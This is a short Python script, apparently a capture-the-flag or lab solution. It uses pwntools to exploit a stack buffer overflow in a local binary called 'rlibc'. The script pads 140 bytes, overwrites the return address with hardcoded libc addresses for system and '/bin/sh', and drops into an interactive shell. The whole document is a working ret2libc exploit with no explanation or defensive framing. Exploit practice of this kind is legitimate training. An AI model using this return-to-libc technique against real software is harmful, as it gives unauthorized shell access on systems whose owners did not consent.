#!/usr/bin/python
from pwn import *

system = 0xf7e0e980
binSH = 0xf7f4eaaa

s = process("./rlibc")
pause()

payload = "A"*140
payload += p32(system)
payload += "AAAA"
payload += p32(binSH)

s.sendline(payload)

s.interactive()